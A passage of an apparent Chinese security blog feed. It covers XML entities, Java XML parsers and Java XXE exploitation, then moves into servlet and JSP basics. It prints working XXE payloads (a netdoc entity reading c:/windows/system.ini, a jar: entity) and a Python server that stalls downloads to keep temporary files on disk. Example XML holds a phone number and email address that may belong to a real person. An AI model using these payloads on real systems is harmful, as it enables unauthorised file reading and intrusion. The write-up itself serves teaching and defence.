class="line">]&gt;</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;&#x2F;author&gt;</span><br></pre></td></tr></table></figure><h4 id="1-5-3-内部参数实体"><a href="#1-5-3-内部参数实体" class="headerlink" title="1.5.3 内部参数实体"></a>1.5.3 内部参数实体</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">person</span> [ </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">name</span> <span class="meta-string">"(#PCDATA)"</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">addr</span> %name;&gt;</span>  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">tel</span> %name;&gt;</span>  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">br</span> <span class="meta-keyword">EMPTY</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">email</span> %name;&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">person</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Jason<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">addr</span>&gt;</span>Shanghai<span class="tag">&lt;/<span class="name">addr</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">tel</span>&gt;</span>18701772821<span class="tag">&lt;/<span class="name">tel</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>/&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">email</span>&gt;</span>18701772821@163.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">person</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="1-5-4-外部参数实体"><a href="#1-5-4-外部参数实体" class="headerlink" title="1.5.4 外部参数实体"></a>1.5.4 外部参数实体</h4><p>test323.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">person</span> [  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">person</span> (<span class="meta-keyword">name</span>,<span class="meta-keyword">addr</span>,<span class="meta-keyword">tel</span>,<span class="meta-keyword">br</span>,<span class="meta-keyword">email</span>)&gt;</span>  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % （注意这里有个空格）content <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"test323.dtd"</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">    %content;  </span></span><br><span class="line"><span class="meta">]&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">person</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jason<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">addr</span>&gt;</span>Shanghai<span class="tag">&lt;/<span class="name">addr</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">tel</span>&gt;</span>18701772821<span class="tag">&lt;/<span class="name">tel</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>/&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">email</span>&gt;</span>18701772821@163.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">person</span>&gt;</span></span><br></pre></td></tr></table></figure><p>test323.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;  </span><br><span class="line">&lt;!ELEMENT name (#PCDATA)&gt;  </span><br><span class="line">&lt;!ELEMENT addr (#PCDATA)&gt;  </span><br><span class="line">&lt;!ELEMENT tel (#PCDATA)&gt;  </span><br><span class="line">&lt;!ELEMENT br EMPTY&gt;  </span><br><span class="line">&lt;!ELEMENT email (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><h2 id="2-Java-XML-解析"><a href="#2-Java-XML-解析" class="headerlink" title="2 Java XML 解析"></a>2 Java XML 解析</h2><p>Java XML 解析 主要相关的函数</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.parsers</span><span class="selector-class">.DocumentBuilderFactory</span>;</span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.parsers</span><span class="selector-class">.SAXParser</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.transform</span><span class="selector-class">.TransformerFactory</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.validation</span><span class="selector-class">.Validator</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.validation</span><span class="selector-class">.SchemaFactory</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.transform</span><span class="selector-class">.sax</span><span class="selector-class">.SAXTransformerFactory</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.transform</span><span class="selector-class">.sax</span><span class="selector-class">.SAXSource</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.xml</span><span class="selector-class">.sax</span><span class="selector-class">.XMLReader</span></span><br><span class="line"><span class="selector-tag">DocumentHelper</span><span class="selector-class">.parseText</span></span><br><span class="line"><span class="selector-tag">DocumentBuilder</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.xml</span><span class="selector-class">.sax</span><span class="selector-class">.helpers</span><span class="selector-class">.XMLReaderFactory</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.dom4j</span><span class="selector-class">.io</span><span class="selector-class">.SAXReader</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.jdom</span><span class="selector-class">.input</span><span class="selector-class">.SAXBuilder</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.jdom2</span><span class="selector-class">.input</span><span class="selector-class">.SAXBuilder</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.bind</span><span class="selector-class">.Unmarshaller</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.xpath</span><span class="selector-class">.XpathExpression</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.stream</span><span class="selector-class">.XMLStreamReader</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.digester3</span><span class="selector-class">.Digester</span></span><br><span class="line"><span class="selector-tag">rg</span><span class="selector-class">.xml</span><span class="selector-class">.sax</span><span class="selector-class">.SAXParseExceptionpublicId</span></span><br></pre></td></tr></table></figure><p>解析实例和防御方法可以查看：</p><p><a href="http://www.lmxspace.com/2019/10/31/Java-XXE-总结/" target="_blank" rel="noopener">http://www.lmxspace.com/2019/10/31/Java-XXE-总结/</a></p><p><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java" target="_blank" rel="noopener">https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java</a></p><h2 id="3-Java-XXE-利用"><a href="#3-Java-XXE-利用" class="headerlink" title="3 Java XXE 利用"></a>3 Java XXE 利用</h2><p>各平台支持的协议如下</p><p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20200824193247.png" alt="image-20200824193246228"></p><ol><li>其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7 update 7 和 Oracle JDK 1.6 update 35</li><li>libxml 是 PHP 的 xml 支持</li></ol><p>Java中的XXE支持 <code>sun.net.www.protocol</code> 里面的所有协议：http，https，file，ftp，mailto，jar，netdoc 。一般利用file协议读取文件、利用http协议探测内网，没有回显时可利用file协议结合http协议或ftp协议来读取文件。</p><p>Java XXE 的利用和 php 的查不多，总结一般的利用方式如下：</p><ul><li>file 协议读文件</li><li>内网主机探测</li><li>内网端口探测</li><li>DoS拒绝服务攻击</li></ul><p>详细可以查看：<code>https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解 XXE 漏洞/</code></p><p>区别于 PHP 的利用方式如下</p><h3 id="3-1-jar-文件上传"><a href="#3-1-jar-文件上传" class="headerlink" title="3.1 jar:// 文件上传"></a>3.1 jar:// 文件上传</h3><p>jar 协议语法，<code>jar:{url}!/{entry}</code>，url是文件的路径，entry是想要解压出来的文件</p><p><strong>jar 协议处理文件的过程：</strong></p><ol><li>下载 jar/zip 文件到临时文件中</li><li>提取出我们指定的文件</li><li>删除临时文件</li></ol><p>那么延长服务器传递文件的时间，就可以延长临时文件存在的时间</p><p>server.py，这里在传输最后一个字符的时候会 sleep 30s</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="keyword">import</span> threading </span><br><span class="line"><span class="keyword">import</span> socketserver </span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote </span><br><span class="line"><span class="keyword">import</span> http.client <span class="keyword">as</span> httpc </span><br><span class="line"></span><br><span class="line">listen_host = <span class="string">'localhost'</span> </span><br><span class="line">listen_port = <span class="number">9999</span> </span><br><span class="line">jar_file = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JarRequestHandler</span><span class="params">(socketserver.BaseRequestHandler)</span>:</span>  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        http_req = <span class="string">b''</span></span><br><span class="line">        print(<span class="string">'New connection:'</span>,self.client_address)</span><br><span class="line">        <span class="keyword">while</span> <span class="string">b'\r\n\r\n'</span> <span class="keyword">not</span> <span class="keyword">in</span> http_req:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                http_req += self.request.recv(<span class="number">4096</span>)</span><br><span class="line">                print(<span class="string">'Client req:\r\n'</span>,http_req.decode())</span><br><span class="line">                jf = open(jar_file, <span class="string">'rb'</span>)</span><br><span class="line">                contents = jf.read()</span><br><span class="line">                headers = (<span class="string">'''HTTP/1.0 200 OK\r\n'''</span></span><br><span class="line">                <span class="string">'''Content-Type: application/java-archive\r\n\r\n'''</span>)</span><br><span class="line">                self.request.sendall(headers.encode(<span class="string">'ascii'</span>))</span><br><span class="line"></span><br><span class="line">                self.request.sendall(contents[:<span class="number">-1</span>])</span><br><span class="line">                time.sleep(<span class="number">30</span>)</span><br><span class="line">                print(<span class="number">30</span>)</span><br><span class="line">                self.request.sendall(contents[<span class="number">-1</span>:])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">"get error at:"</span>+str(e))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler) </span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'waiting for connection...'</span>) </span><br><span class="line">    server_thread = threading.Thread(target=jarserver.serve_forever) </span><br><span class="line">    server_thread.daemon = <span class="literal">True</span> </span><br><span class="line">    server_thread.start() </span><br><span class="line">    server_thread.join()</span><br></pre></td></tr></table></figure><p>运行服务器，让其监听</p><p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20200824182027.png" alt="image-20200824182026676"></p><p>然后 xxe 结合 jar 协议</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY  <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"jar:http://localhost:9999/1.zip!/wm.php"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">convert</span>&gt;</span><span class="symbol">&amp;remote;</span><span class="tag">&lt;/<span class="name">convert</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因为 <code>1.zip</code> 中并不存在 <code>wm.php</code> 这个文件，所以可以在报错中看到临时文件的位置</p><p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20200824182311.png" alt="image-20200824182309774"></p><p>这里实际测试并不一定只能上传 <code>zip</code> 格式的文件，但因为 jar 协议会对文件进行解包操作，如果不上传 <code>zip</code> 格式文件在报错里是看不到临时文件路径的，所以需要先正常上传一次 <code>zip</code> 格式文件获取路径然后再上传其他文件。</p><p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20200824182435.png" alt="image-20200824182434415"></p><h3 id="3-2-netdoc-协议"><a href="#3-2-netdoc-协议" class="headerlink" title="3.2 netdoc 协议"></a>3.2 netdoc 协议</h3><p>Java 中 netdoc 协议可以替代 file 协议功能，读文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [</span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ELEMENT <span class="meta-keyword">creds</span> <span class="meta-keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"netdoc:///c:/windows/system.ini"</span>&gt;</span></span></span><br><span class="line"><span class="meta">        ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><p>同时也可以列目录：</p><p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20200824191609.png" alt="image-20200824191608338"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><p><a href="https://thief.one/2017/06/20/1/" target="_blank" rel="noopener">https://thief.one/2017/06/20/1/</a></p></li><li><p><a href="https://xz.aliyun.com/t/6829" target="_blank" rel="noopener">https://xz.aliyun.com/t/6829</a></p></li><li><p><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20XXE%20%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">一篇文章带你深入理解 XXE 漏洞 - K0rz3n</a></p></li><li><p><a href="https://www.smi1e.top/dsada/" target="_blank" rel="noopener">https://www.smi1e.top/dsada/</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-XML-基础&quot;&gt;&lt;a href=&quot;#1-XML-基础&quot; class=&quot;headerlink&quot; title=&quot;1 XML 基础&quot;&gt;&lt;/a&gt;1 XML 基础&lt;/h2&gt;&lt;p&gt;XML(可扩展标记语言，EXtensible Markup Language )，是一种标记语言，用来传输和存储数据&lt;/p&gt;
&lt;h3 id=&quot;1-1-XML文档结构&quot;&gt;&lt;a href=&quot;#1-1-XML文档结构&quot; class=&quot;headerlink&quot; title=&quot;1.1 XML文档结构&quot;&gt;&lt;/a&gt;1.1 XML文档结构&lt;/h3&gt;&lt;p&gt;XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Java" scheme="https://jlkl.github.io/tags/Java/"/>
    
      <category term="XXE" scheme="https://jlkl.github.io/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>Java Web 基础</title>
    <link href="https://jlkl.github.io/2020/08/23/Java_02/"/>
    <id>https://jlkl.github.io/2020/08/23/Java_02/</id>
    <published>2020-08-23T07:23:13.000Z</published>
    <updated>2020-08-23T07:29:49.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-Java-Web-目录结构"><a href="#1-Java-Web-目录结构" class="headerlink" title="1 Java Web 目录结构"></a>1 Java Web 目录结构</h2><p><img src="/2020/08/23/Java_02/20200816173242.png" alt="image-20200816173234356"></p><table><thead><tr><th align="center">目录</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">/test1_war_exploded</td><td align="center">Web应用根目录，存储 jsp 或 html 文件</td></tr><tr><td align="center">/test1_war_exploded/WEB-INF</td><td align="center">存放配置文件，不能直接访问</td></tr><tr><td align="center">/test1_war_exploded/WEB-INF/classes</td><td align="center">存放编译后的 class 文件</td></tr><tr><td align="center">/test1_war_exploded/WEB-INF/lib</td><td align="center">存放所需 jar 文件，如 JDBC 驱动的 jar 文件</td></tr></tbody></table><p>web.xml：servlet 、servlet mapping 以及其他配置</p><p>编译 servlet 命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac  -sourcepath src -classpath D:\soft\server\apache-tomcat-9.0.37\lib\servlet-api.jar -d WEB-INF\classes src\mypack\DispatcherServlet.java</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="2-Servlet"><a href="#2-Servlet" class="headerlink" title="2 Servlet"></a>2 Servlet</h2><p>Servlet API 主要由两个 Java 包组成：<code>javax.servlet</code> 和 <code>javax.servlet.http</code> 。在 <code>javax.servlet</code> 中定义了 Servlet 接口以及相关通用接口和类。在 <code>javax.servlet.http</code> 主要定义了与 HTTP 协议相关的 HttpServlet 类、HttpServletRequest 接口和 HttpServletResponse 接口。</p><p><code>javax.servlet.Servlet</code> 接口主要定义了<code>servlet</code>基础生命周期方法：<code>init(初始化)</code>、<code>getServletConfig(配置)</code>、<code>service(服务)</code>、<code>destroy(销毁)</code>。</p><p><code>javax.servlet.http.HttpServlet</code>类继承于<code>javax.servlet.GenericServlet</code>，而<code>GenericServlet</code>又实现了<code>javax.servlet.Servlet</code>和<code>javax.servlet.ServletConfig</code>。而<code>HttpServlet</code>不仅实现了<code>servlet</code>的生命周期并通过封装<code>service</code>方法抽象出了<code>doGet/doPost/doDelete/doHead/doPut/doOptions/doTrace</code>方法用于处理来自客户端的不一样的请求方式，我们的Servlet只需要重写其中的请求方法或者重写<code>service</code>方法即可实现<code>servlet</code>请求处理。</p><p><strong>TestServlet示例代码:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.anbai.sec.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creator: yz</span></span><br><span class="line"><span class="comment"> * Date: 2019/12/14</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 如果使用注解方式请取消@WebServlet注释并注释掉web.xml中TestServlet相关配置</span></span><br><span class="line"><span class="comment">//@WebServlet(name = "TestServlet", urlPatterns = &#123;"/TestServlet"&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        PrintWriter out = response.getWriter();</span><br><span class="line">        out.println(<span class="string">"Hello World~"</span>);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-1-配置-Servlet-的两种方式"><a href="#2-1-配置-Servlet-的两种方式" class="headerlink" title="2.1 配置 Servlet 的两种方式"></a>2.1 配置 Servlet 的两种方式</h3><p>（1）web.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcher<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>mypack.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcher<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/dispatcher<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>（2）使用 Annotation 标注</p><p>在 Servlet3.0 之后( Tomcat7+)可以使用注解方式配置 Servlet 了,在任意的Java类添加<code>javax.servlet.annotation.WebServlet</code>注解即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">……</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet</span>(name=<span class="string">"FontServlet1"</span>, urlPatterns=&#123;<span class="string">"/font1"</span>&#125;, initParams=&#123;<span class="meta">@WebInitParam</span>(name=<span class="string">"color"</span>,value=<span class="string">"blue"</span>),<span class="meta">@WebInitParam</span>(name=<span class="string">"size"</span>,value=<span class="string">"15"</span>)&#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FontServlet1</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span></span>&#123;……&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/08/23/Java_02/20200818112151.png" alt="image-20200818112122387"></p><h3 id="2-2-Request-amp-Response"><a href="#2-2-Request-amp-Response" class="headerlink" title="2.2 Request &amp; Response"></a>2.2 Request &amp; Response</h3><p><strong>HttpServletRequest 常用方法</strong></p><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>getParameter(String name)</td><td>获取请求中的参数，该参数是由name指定的</td></tr><tr><td>getParameterValues(String name)</td><td>返回请求中的参数值，该参数值是由name指定的</td></tr><tr><td>getRealPath(String path)</td><td>获取Web资源目录</td></tr><tr><td>getAttribute(String name)</td><td>返回name指定的属性值</td></tr><tr><td>getAttributeNames()</td><td>返回当前请求的所有属性的名字集合</td></tr><tr><td>getCookies()</td><td>返回客户端发送的Cookie</td></tr><tr><td>getSession()</td><td>获取session回话对象</td></tr><tr><td>getInputStream()</td><td>获取请求主题的输入流</td></tr><tr><td>getReader()</td><td>获取请求主体的数据流</td></tr><tr><td>getMethod()</td><td>获取发送请求的方式，如GET、POST</td></tr><tr><td>getParameterNames()</td><td>获取请求中所有参数的名称</td></tr><tr><td>getRemoteAddr()</td><td>获取客户端的IP地址</td></tr><tr><td>getRemoteHost()</td><td>获取客户端名称</td></tr><tr><td>getServerPath()</td><td>获取请求的文件的路径</td></tr></tbody></table><p><strong>HttpServletResponse 常用方法</strong></p><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>getWriter()</td><td>获取响应打印流对象</td></tr><tr><td>getOutputStream()</td><td>获取响应流对象</td></tr><tr><td>addCookie(Cookie cookie)</td><td>将指定的Cookie加入到当前的响应中</td></tr><tr><td>addHeader(String name,String value)</td><td>将指定的名字和值加入到响应的头信息中</td></tr><tr><td>sendError(int sc)</td><td>使用指定状态码发送一个错误到客户端</td></tr><tr><td>sendRedirect(String location)</td><td>发送一个临时的响应到客户端</td></tr><tr><td>setDateHeader(String name,long date)</td><td>将给出的名字和日期设置响应的头部</td></tr><tr><td>setHeader(String name,String value)</td><td>将给出的名字和值设置响应的头部</td></tr><tr><td>setStatus(int sc)</td><td>给当前响应设置状态码</td></tr><tr><td>setContentType(String ContentType)</td><td>设置响应的MIME类型</td></tr></tbody></table><h2 id="3-JSP-基础"><a href="#3-JSP-基础" class="headerlink" title="3 JSP 基础"></a>3 JSP 基础</h2><h3 id="3-1-JSP-指令"><a href="#3-1-JSP-指令" class="headerlink" title="3.1 JSP 指令"></a>3.1 JSP 指令</h3><p>JSP 指令用来设置和整个网页相关的属性，如编码方式和脚本语言等</p><p>一般语法：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span 